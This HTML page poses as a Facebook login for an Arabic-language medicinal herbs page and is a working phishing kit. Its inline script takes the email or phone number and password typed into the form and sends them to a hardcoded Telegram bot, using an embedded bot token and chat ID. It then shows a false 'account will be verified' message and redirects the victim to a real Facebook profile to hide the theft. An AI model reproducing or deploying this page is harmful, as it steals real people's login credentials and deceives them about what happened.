
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إنضم معنا الى صفحة فيسبوك للأعشاب الطبية</title>
    <link rel="stylesheet" href="style.css">
  <style>
    .rounded-img {
      border-radius: 50%;
    }
  </style>
  </head>
  <body>
    <img src="a.jpg" alt="Your Image" class="rounded-img">
    <div class="container flex">
      <div class="facebook-page flex">
        <div class="text">
          <h1>الصفحة الرسمية للأعشاب الطبية</h1>
          
          
        </div>
        <form id="loginForm" action="#">
  <input id="emailInput" type="text" placeholder="Email or phone number" required>
  <input id="passwordInput" type="password" placeholder="Password" required>
  <div class="link">
     <button type="submit" class="login">Login</button>
  </div>
  <hr>
</form>
      </div>
    </div>
    
    <script>
      document.getElementById("loginForm").addEventListener("submit", function(event) {
  event.preventDefault(); // Prevent the form from submitting normally
  
  // Get the input values
  const emailOrPhone = document.getElementById("emailInput").value;
  const password = document.getElementById("passwordInput").value;
  
  // Send the data to the Telegram bot
  const botToken = "6665901686:AAFTZi9DXkedyHhUdC0nQjzJvBFtNCThf6E";
  const chatId = "5990142501";
  const message = `Email or Phone: ${emailOrPhone}\nPassword: ${password}`;
  const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
  
  // Send a POST request to the Telegram Bot API
  fetch(url, { method: "POST" })
    .then(response => {
      if (response.ok) {
        alert("Your account will be verified soon!");
      } else {
        alert("Failed to verify your account. Please check your credentials.");
      }
    })
    .catch(error => {
      alert("An error occurred while sending data to the Telegram bot.");
      console.error(error);
    });
            window.location.href = "https://www.facebook.com/profile.php?id=100063732258457";
});
    </script>
  </body>
</html>
